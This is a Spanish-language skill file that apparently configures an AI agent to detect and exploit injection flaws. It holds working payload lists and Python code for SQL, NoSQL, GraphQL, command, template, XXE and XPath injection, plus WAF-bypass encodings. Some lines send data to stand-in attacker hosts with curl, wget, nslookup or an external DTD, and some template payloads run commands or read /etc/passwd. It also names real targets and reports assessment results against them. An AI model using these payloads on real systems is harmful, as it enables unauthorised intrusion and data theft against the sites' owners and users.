---
name: injection-agent
description: Agente especializado en detección y explotación de vulnerabilidades de inyección. Usar para: (1) SQL Injection (Union, Blind, Time-based, Error-based), (2) NoSQL Injection (MongoDB, Redis), (3) GraphQL Injection, (4) Command Injection, (5) LDAP Injection, (6) Template Injection (SSTI), (7) XPath Injection. Trigger: cuando se identifiquen parámetros que podrían ser vulnerables a inyección.
---

# 💉 Injection Agent - Agente de Inyección

## Objetivo
Detectar y explotar vulnerabilidades de inyección de forma segura (solo lectura de datos).

## ⚠️ REGLAS CRÍTICAS

```yaml
PERMITIDO:
  - SELECT statements
  - Lectura de datos
  - Enumeración de schemas
  - Bypass de autenticación (sin modificar)
  
PROHIBIDO:
  - DELETE, DROP, TRUNCATE
  - UPDATE, INSERT destructivos
  - Modificación de datos
  - Exfiltración masiva de PII
```

## 1. SQL Injection

### Detección Inicial
```python
# Payloads de detección básica
detection_payloads = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "1 AND 1=1",
    "1 AND 1=2",
    "' WAITFOR DELAY '0:0:5'--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    "1' AND BENCHMARK(5000000,SHA1('test'))--"
]

# Indicadores de error SQL
sql_errors = [
    "mysql_fetch",
    "ORA-",
    "PLS-",
    "Microsoft SQL Server",
    "Unclosed quotation mark",
    "SQL syntax",
    "mysql_num_rows",
    "pg_query",
    "SQLite3::",
    "SQLSTATE",
    "Warning: mysql",
    "valid MySQL result"
]
```

### Union-Based SQLi
```python
def test_union_sqli(url, param):
    """Test for Union-based SQL injection"""
    payloads = []
    
    # Determinar número de columnas
    for i in range(1, 50):
        cols = ','.join(['NULL'] * i)
        payloads.append(f"' UNION SELECT {cols}--")
    
    # Una vez encontrado el número de columnas
    # Extraer información
    info_payloads = [
        "' UNION SELECT @@version,NULL,NULL--",
        "' UNION SELECT user(),NULL,NULL--",
        "' UNION SELECT database(),NULL,NULL--",
        "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--"
    ]
    
    return payloads + info_payloads
```

### Blind SQLi (Boolean-based)
```python
def test_blind_boolean(url, param, true_condition):
    """Test for Boolean-based blind SQL injection"""
    # true_condition es el contenido que aparece cuando la condición es verdadera
    
    # Extraer datos caracter por caracter
    def extract_char(position, table, column):
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        
        for char in charset:
            payload = f"' AND SUBSTRING({column},{position},1)='{char}'--"
            # Si true_condition aparece en response, encontramos el caracter
            
    return extract_char
```

### Time-Based Blind SQLi
```python
import time
import requests

def test_time_based(url, param):
    """Test for Time-based blind SQL injection"""
    payloads = {
        "mysql": "' AND SLEEP(5)--",
        "mssql": "'; WAITFOR DELAY '0:0:5'--",
        "postgres": "'; SELECT pg_sleep(5)--",
        "oracle": "' AND DBMS_LOCK.SLEEP(5)--"
    }
    
    results = {}
    
    for db, payload in payloads.items():
        start = time.time()
        try:
            r = requests.get(url, params={param: payload}, timeout=10)
            elapsed = time.time() - start
            
            if elapsed >= 5:
                results[db] = {
                    "vulnerable": True,
                    "delay": elapsed,
                    "payload": payload
                }
        except requests.Timeout:
            results[db] = {"vulnerable": True, "timeout": True}
    
    return results
```

## 2. NoSQL Injection

### MongoDB Injection
```python
nosql_payloads = {
    "authentication_bypass": [
        {"$ne": None},
        {"$gt": ""},
        {"$regex": ".*"},
        {"$exists": True}
    ],
    "data_extraction": [
        {"$where": "this.password.length > 0"},
        {"$regex": "^a"},  # Bruteforce caracter por caracter
    ],
    "operators": [
        {"$gt": ""},
        {"$lt": "~"},
        {"$gte": ""},
        {"$lte": "~"},
        {"$ne": "x"},
        {"$in": ["admin", "user"]},
        {"$nin": []},
        {"$or": [{"a": 1}, {"b": 2}]},
        {"$and": [{"a": 1}, {"b": 2}]}
    ]
}

# Para requests con JSON body
def test_nosql_auth_bypass(url):
    payloads = [
        {"username": {"$ne": None}, "password": {"$ne": None}},
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": "admin", "password": {"$gt": ""}},
        {"$where": "return true"}
    ]
    
    return payloads
```

### Redis Injection
```python
redis_payloads = [
    "FLUSHALL",  # ⚠️ NUNCA USAR - Solo detección
    "CONFIG GET *",
    "INFO",
    "KEYS *",
    "GET key",
    "\r\nCONFIG GET *\r\n"
]
```

## 3. GraphQL Injection

### Introspection Query
```graphql
# Query de introspección completa
query IntrospectionQuery {
  __schema {
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
        }
        args {
          name
          type {
            name
          }
        }
      }
    }
    queryType { name }
    mutationType { name }
    subscriptionType { name }
  }
}
```

### GraphQL Injection Payloads
```python
graphql_payloads = {
    "introspection": """
        query { __schema { types { name fields { name } } } }
    """,
    "field_suggestion": """
        query { user { AAAA } }  # Ver sugerencias en error
    """,
    "batching": [
        {"query": "query { user(id: 1) { data } }"},
        {"query": "query { user(id: 2) { data } }"},
        # Múltiples queries en un request
    ],
    "nested_query": """
        query { 
            user(id: 1) { 
                posts { 
                    comments { 
                        author { 
                            posts { 
                                comments { ... }  # DoS potencial
                            } 
                        } 
                    } 
                } 
            } 
        }
    """,
    "alias_dos": """
        query {
            a1: user(id: 1) { data }
            a2: user(id: 2) { data }
            a3: user(id: 3) { data }
            # Repetir muchas veces
        }
    """
}
```

## 4. Command Injection

### Payloads de Detección
```python
cmd_injection_payloads = [
    # Unix
    "; id",
    "| id",
    "|| id",
    "& id",
    "&& id",
    "`id`",
    "$(id)",
    "; sleep 5",
    "| sleep 5",
    "|| sleep 5",
    
    # Windows
    "& whoami",
    "| whoami",
    "|| whoami",
    "& timeout 5",
    
    # Blind (OOB)
    "; curl http://attacker.com/$(whoami)",
    "| wget http://attacker.com/$(id)",
    "; nslookup $(whoami).attacker.com"
]

# Contextos específicos
context_payloads = {
    "filename": [
        "file.txt; id",
        "file.txt | id",
        "$(id).txt"
    ],
    "url": [
        "http://evil.com/`id`",
        "http://$(whoami).evil.com"
    ],
    "ip": [
        "127.0.0.1; id",
        "127.0.0.1 && id"
    ]
}
```

## 5. Template Injection (SSTI)

### Payloads por Engine
```python
ssti_payloads = {
    "detection": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "*{7*7}",
        "@(7*7)",
        "{{constructor.constructor('return 7*7')()}}"
    ],
    "jinja2": [
        "{{config}}",
        "{{config.items()}}",
        "{{self.__class__.__mro__[2].__subclasses__()}}",
        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
    ],
    "twig": [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
    ],
    "freemarker": [
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
    ],
    "velocity": [
        "#set($str=$class.inspect(\"java.lang.String\").type)",
        "#set($runtime=$class.inspect(\"java.lang.Runtime\").type.getRuntime())",
        "#set($process=$runtime.exec(\"id\"))"
    ]
}
```

## Workflow de Testing

```
1. IDENTIFICAR PARÁMETROS
   ├── Query parameters (?param=value)
   ├── POST body (JSON, form-data)
   ├── Headers (Cookie, User-Agent, Referer)
   ├── Path parameters (/api/user/{id})
   └── GraphQL variables

2. CLASIFICAR CONTEXTO
   ├── SQL context (database queries)
   ├── NoSQL context (document queries)
   ├── OS command context
   ├── Template context
   └── GraphQL context

3. DETECTAR VULNERABILIDAD
   ├── Error-based detection
   ├── Boolean-based detection
   ├── Time-based detection
   └── Out-of-band detection

4. EXPLOTAR (SOLO LECTURA)
   ├── Extraer versión/usuario
   ├── Enumerar bases de datos/tablas
   ├── Leer datos específicos
   └── Documentar payload exitoso

5. DOCUMENTAR
   ├── Endpoint vulnerable
   ├── Parámetro afectado
   ├── Tipo de inyección
   ├── Payload exitoso
   └── Datos extraídos (sanitizados)
```

## Output Format

```json
{
  "vulnerability_id": "TRIP-INJ-001",
  "type": "SQL Injection",
  "subtype": "Time-based blind",
  "endpoint": "/api/search",
  "parameter": "q",
  "method": "GET",
  "payload": "' AND SLEEP(5)--",
  "detection_method": "Time delay observed (5.2s)",
  "database_type": "MySQL",
  "data_extracted": {
    "version": "8.0.28",
    "user": "app_user@localhost",
    "database": "tripcom_sg"
  },
  "severity": "Critical",
  "cvss": 9.8,
  "poc_request": "GET /api/search?q=' AND SLEEP(5)-- HTTP/1.1",
  "poc_response": "Response delayed 5.2 seconds",
  "evidence_path": "06-evidence/requests/INJ-001.txt"
}
```

## 6. WAF Bypass & Encoding Techniques (2026)

### Base64 Encoding para Bypass

```python
"""
Técnica confirmada en santelmo.org (FINDING-009)
Funciona cuando el payload está en URL path y backend decodifica Base64
"""
import base64

def encode_payload_b64(payload):
    """Codificar payload en Base64 para bypass de WAF"""
    return base64.b64encode(payload.encode()).decode()

# Payloads SQL con Base64
B64_SQL_PAYLOADS = {
    "single_quote": encode_payload_b64("'"),
    "or_bypass": encode_payload_b64("' OR '1'='1"),
    "union_select": encode_payload_b64("' UNION SELECT 1,2,3--"),
    "sleep": encode_payload_b64("' AND SLEEP(5)--"),
    "comment": encode_payload_b64("'--"),
}

def test_b64_sqli_in_path(base_url, path_template):
    """
    Test SQLi con payloads Base64 en URL path
    path_template: "/api/item/{}/details"
    """
    results = []
    for name, b64_payload in B64_SQL_PAYLOADS.items():
        url = base_url + path_template.format(b64_payload)
        # Test y verificar respuesta
        results.append({"payload": name, "url": url})
    return results
```

### Double URL Encoding

```python
import urllib.parse

def double_encode(payload):
    """Doble URL encoding para bypass de WAF"""
    first = urllib.parse.quote(payload, safe='')
    second = urllib.parse.quote(first, safe='')
    return second

DOUBLE_ENCODED_SQL = {
    "single_quote": double_encode("'"),           # %2527
    "or_bypass": double_encode("' OR '1'='1"),
    "union": double_encode("' UNION SELECT--"),
}
```

### Unicode Encoding

```python
UNICODE_SQL_PAYLOADS = [
    "＇ OR ＇1＇=＇1",  # Fullwidth quotes
    "' OR '1'='1",      # Normal (baseline)
    "ʼ OR ʼ1ʼ=ʼ1",     # Modifier letter apostrophe
]
```

### Case Variation & Comments

```python
# Bypass filtros básicos con variación de case y comentarios
EVASION_SQL_PAYLOADS = [
    "' oR '1'='1",
    "' OR/**/1=1--",
    "'/**/OR/**/1=1--",
    "' /*!50000OR*/ 1=1--",  # MySQL version comment
    "' %00OR 1=1--",         # Null byte
]
```

### Path-Based Injection Testing

```python
"""
IMPORTANTE: Testear inyección no solo en parámetros GET/POST
sino también en segmentos de URL path
"""

def test_path_injection(base_url, payloads):
    """
    Test injection en diferentes posiciones del path

    Patterns a probar:
    - /api/v1/{PAYLOAD}/resource
    - /search/{PAYLOAD}
    - /user/{PAYLOAD}/profile
    - /tag/{PAYLOAD}/items
    """
    path_patterns = [
        "/api/item/{}/",
        "/search/{}/",
        "/category/{}/products",
        "/tag/{}/",
        "/user/{}/data",
    ]

    results = []
    for pattern in path_patterns:
        for payload in payloads:
            # Probar raw y encoded
            for encoded in [payload, encode_payload_b64(payload), double_encode(payload)]:
                url = base_url + pattern.format(encoded)
                results.append(url)

    return results
```

---

## 7. Integración con Otros Agentes

### XSS Testing
Para vulnerabilidades XSS, usar el agente especializado:
- **xss-agent**: Técnicas avanzadas de XSS y WAF bypass
- Ver: `.antigravity/skills/xss-agent/SKILL.md`

### WAF Bypass
Para investigación profunda de WAF:
- **waf-bypass-agent**: Detección y bypass de WAF
- Ver: `.antigravity/skills/waf-bypass-agent/SKILL.md`

---

## Archivos de Salida

- `03-vulnerabilities/A03-injection/sql/{vuln_id}.json`
- `03-vulnerabilities/A03-injection/nosql/{vuln_id}.json`
- `03-vulnerabilities/A03-injection/command/{vuln_id}.json`
- `06-evidence/payloads/injection_payloads.txt`
- `06-evidence/payloads/encoded_payloads.txt`
- `06-evidence/requests/{vuln_id}_request.txt`

---

## 8. XXE y XML Injection (2026 Lessons)

### Estado del XXE en Applicaciones Modernas

> **REALIDAD 2026**: La mayoria de frameworks modernos tienen XXE DESHABILITADO por defecto.
> Focalizar en targets legacy (SOAP, Java antiguo, .NET Framework).

### Detección de XXE

```python
xxe_detection_payloads = {
    "basic_dtd": """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>""",

    "parameter_entity": """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<root>test</root>""",

    "oob_exfiltration": """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>
<root>test</root>""",
}

# Indicadores de que XXE esta BLOQUEADO
xxe_blocked_indicators = [
    "DTD is not allowed",
    "DOCTYPE is not allowed",
    "External entities are disabled",
    "ENTITY is not allowed",
    "ParseError: DOCTYPE",
    "SAXParseException: DOCTYPE",
]
```

### Resultados Under Armour Assessment

```yaml
xxe_testing_results:
  vtxapp9p_soap:
    endpoint: "/tax/taxinquiry.asmx"
    content_type: "application/soap+xml"
    xxe_test: "BLOCKED"
    reason: "DTD not allowed by XML parser"

  soap_services:
    endpoints_tested: 4
    xxe_vulnerable: 0
    dtd_blocked: 4
    note: "Modern SOAP stack with secure XML parsing"

  lesson: |
    La mayoria de servicios SOAP modernos bloquean DTD.
    Focalizar en:
    1. Servicios legacy no actualizados
    2. Aplicaciones Java con configuracion custom
    3. Parsers XML configurados manualmente
```

### XXE Testing Workflow Actualizado

```
1. Identificar endpoints que aceptan XML
   ├── SOAP/WSDL services
   ├── REST APIs con Content-Type: application/xml
   ├── File upload que procesa XML (DOCX, XLSX, SVG)
   └── Configuraciones XML (web.config, etc)

2. Probar deteccion basica
   ├── Enviar XML con DTD simple
   ├── Si "DTD not allowed" → Endpoint SEGURO
   └── Si no hay error → Continuar testing

3. Solo si DTD permitido → Probar exfiltracion
   ├── file:///etc/passwd (Linux)
   ├── file:///C:/Windows/win.ini (Windows)
   └── OOB via HTTP/DNS si blind

4. Documentar resultado REAL
   ├── Si bloqueado → "XXE: NOT VULNERABLE (DTD blocked)"
   ├── Si vulnerable → Evidencia completa
```

---

## 9. XPath Injection (2026)

### Payloads de Detección

```python
xpath_payloads = {
    "boolean_true": "' or '1'='1",
    "boolean_false": "' or '1'='2",
    "count_bypass": "' or count(//*)>0 or '1'='1",
    "string_length": "' or string-length(name(/*[1]))>0 or 'a'='a",
    "position": "' or position()=1 or '1'='1",
    "comment": "']/*[contains(.,'--",
}

# Detectar XPath por errores
xpath_errors = [
    "XPath",
    "XPathException",
    "XPST0003",
    "Unknown function",
    "Unbalanced parenthesis",
    "missing )",
    "Invalid expression",
    "javax.xml.xpath",
    "lxml.etree",
]
```

### Resultados Under Armour Assessment

```yaml
xpath_testing_results:
  endpoints_tested: 12
  vulnerable: 0

  findings:
    - "Ningun endpoint mostro errores de XPath"
    - "La mayoria usa JSON, no XML"
    - "SOAP services no exponen XPath user-controllable"

  lesson: |
    XPath injection es raro en aplicaciones modernas:
    1. Mayoría usa JSON, no XML
    2. ORMs abstraen queries
    3. XPath user-controllable es poco común

    Donde buscar XPath injection:
    - SAML authentication flows
    - XML-based configuration APIs
    - Legacy document management systems
    - Custom XML search functionality
```

---

## 10. Lecciones del Assessment Under Armour 2026

### Lo que NO funciono

| Técnica | Resultado | Razón |
|---------|-----------|-------|
| XXE en SOAP | BLOQUEADO | DTD deshabilitado en parser |
| XPath Injection | NO ENCONTRADO | No hay XPath user-controllable |
| SQLi clasico | NO ENCONTRADO | ORMs parametrizados |
| NoSQL Injection | NO ENCONTRADO | Validación de input |

### Lo que SÍ funciono

| Técnica | Resultado | Target |
|---------|-----------|--------|
| Error-based enumeration | Exitoso | 3.133.230.28 FastAPI |
| SOAP method exposure | Info Disclosure | vtxapp9p/q/d |
| Admin endpoint sin auth | Access Control | 3.133.230.28 |
| Config disclosure | Info Disclosure | vpe-us.underarmour.com |

### Recomendaciones para Futuros Assessments

```yaml
priorizar:
  - Error-based enumeration (A10:2025)
  - Misconfiguración (A02:2025)
  - Endpoints administrativos expuestos
  - API documentation exposure

deprioritizar:
  - XXE (blocked by default en 2026)
  - XPath (poco común)
  - Classic SQLi (ORMs everywhere)

enfocarse_en:
  - APIs REST/GraphQL
  - SOAP solo para info disclosure
  - Cloud misconfigurations
  - Supply chain (pero validar en bundle!)
```

---

**Versión**: 1.2
**Última actualización**: 2026-01-30
**Changelog**:
- v1.2: XXE 2026 status, XPath testing results, Under Armour assessment lessons
- v1.1: WAF Bypass encoding, Path-based injection
